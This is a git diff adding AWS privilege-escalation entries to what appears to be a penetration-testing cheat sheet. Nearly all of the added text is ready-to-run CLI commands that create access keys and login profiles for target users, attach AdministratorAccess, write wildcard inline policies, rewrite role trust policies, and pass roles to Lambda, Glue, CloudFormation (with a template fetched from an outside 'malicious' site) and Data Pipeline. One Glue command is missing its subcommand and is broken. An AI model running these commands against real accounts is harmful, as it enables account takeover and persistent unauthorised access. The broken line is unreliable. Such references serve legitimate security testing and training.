@@ -138,7 +138,7 @@ aws iam get-group-policy --group-name <group-name> --policy-name <policy-name>
 aws iam get-role-policy --role-name  <role-name> --policy-name <policy-name>
 ```
 
-## Privesc with IAM overly permissive right
+## Privesc with overly permissive right
 
 ### PACU - Scan for IAM Privesc
 
@@ -155,7 +155,130 @@ aws iam create-policy-version --policy-arn <policy-arn> --policy-document '{"Ver
 ### Abuse iam:SetDefaultPolicyVersion
 
 ```
-aws iam set-default-policy-version --policy-arn <policy-arn> –version-id <vX>
+aws iam set-default-policy-version --policy-arn <policy-arn> --version-id <vX>
+```
+
+### Creating an EC2 instance with an existing instance profile - iam:PassRole & ec2:RunInstances
+
+```
+aws ec2 run-instances --image-id <image-id> --instance-type t2.micro --iam-instance-profile Name=<instance-profile> --key-name <my_ssh_key> --security-group-ids <security-groups-ids>
+```
+
+### Creating user access key - iam:CreateAccessKey
+
+```
+aws iam create-access-key --user-name <target_user>
+```
+
+### Creating a new login profile - iam:CreateLoginProfile
+
+```
+aws iam create-login-profile --user-name <target_user> --password '<password>' --no-password-reset-required
+```
+
+### Updating an existing login profile - iam:UpdateLoginProfile
+
+```
+aws iam update-login-profile --user-name <target_user> --password '<password>' --no-password-reset-required
+```
+
+### Abuse iam:AttachUserPolicy
+
+```
+aws iam attach-user-policy --user-name <target_user> --policy-arn 'arn:aws:iam::aws:policy/AdministratorAccess'
+```
+
+### Abuse iam:AttachGroupPolicy
+
+```
+aws iam attach-group-policy --group-name <my_group> --policy-arn 'arn:aws:iam::aws:policy/AdministratorAccess'
+```
+
+### Abuse iam:AttachRolePolicy
+
+```
+aws iam attach-role-policy --role-name <my_role> --policy-arn 'arn:aws:iam::aws:policy/AdministratorAccess'
+```
+
+### Abuse creating/updating an inline policy - iam:PutUserPolicy
+
+```
+aws iam put-user-policy --user-name <user-name> --policy-name <policy-name-random> --policy-document '{"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]}'
+```
+
+### Abuse creating/updating an inline policy - iam:PutGroupPolicy
+
+```
+aws iam put-group-policy --group-name <my-group> --policy-name <policy-name-random> --policy-document '{"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]}'
+```
+
+### Abuse creating/updating an inline policy - iam:PutRolePolicy
+
+```
+aws iam put-role-policy --role-name <my-role> --policy-name <policy-name-random> --policy-document '{"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]}'
+```
+
+### Adding a user to a group - iam:AddUserToGroup
+
+```
+aws iam add-user-to-group --group-name <target_group> --user-name <user-name>
+```
+
+### Abuse iam:UpdateAssumeRolePolicy & sts:AssumeRole 
+
+```
+aws iam update-assume-role-policy --role-name <target-role> --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow",
+"Principal":{"AWS":"arn:aws:iam::<account-id>:user/<user-name>"},"Action":["sts:AssumeRole"]}]}'
+```
+
+### Passing a role to a new Lambda function, then invoking it
+
+```
+aws lambda create-function --function-name <my_function> --runtime python3.6 --role <arn_of_lambda_role> --handler lambda_function.lambda_handler --code file://<my_python_code.py>
+```
+
+### Passing a role to a new Lambda function, then triggering it with DynamoDB
+
+```
+aws lambda create-function --function-name <my_function> --runtime python3.6 --role <arn_of_lambda_role> --handler lambda_function.lambda_handler --code file://<my_python_code.py>;
+
+aws dynamodb create-table --table-name <my_table> --attribute-definitions AttributeName=Test,AttributeType=S --key-schema AttributeName=Test,KeyType=HASH --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 --stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES;
+
+aws lambda create-event-source-mapping --function-name <my_function> --event-source-arn arn_of_dynamodb_table_stream --enabled --starting-position LATEST;
+
+aws dynamodb put-item --table-name <my_table> --item Test={S=”Random string”}
+```
+
+### Updating the code of an existing Lambda function - lambda:UpdateFunctionCode
+
+```
+aws lambda update-function-code --function-name <target-function> --code fileb://<my/pythontocode.zip>;
+```
+
+### Abuse glue:CreateDevEndpoint & iam:PassRole 
+
+```
+aws glue create-dev-endpoint --endpoint-name <new_dev_endpoint> --role-arn <arn_of_glue_service_role> --public-key file://<path/to/my/public/ssh/key.pub>
+```
+
+### Abuse glue:UpdateDevEndpoint
+
+```
+aws glue --endpoint-name <target_endpoint> --public-key file://<path/to/my/public/ssh/key.pub>
+```
+
+### Abuse cloudformation:CreateStack & iam:PassRole
+
+```
+aws cloudformation create-stack --stack-name <my_stack> --template-url http://<my-website.com/my-malicious-template.template> --role-arn <arn_of_cloudformation_service_role>
+```
+
+### Passing a role to Data Pipeline
+
+```
+aws datapipeline create-pipeline --name my_pipeline --unique-id <unique_string>;
+
+aws datapipeline put-pipeline-definition --pipeline-id <unique_string> --pipeline-definition file://<path/to/my/pipeline/definition.json>
 ```
 
 ## Bucket S3
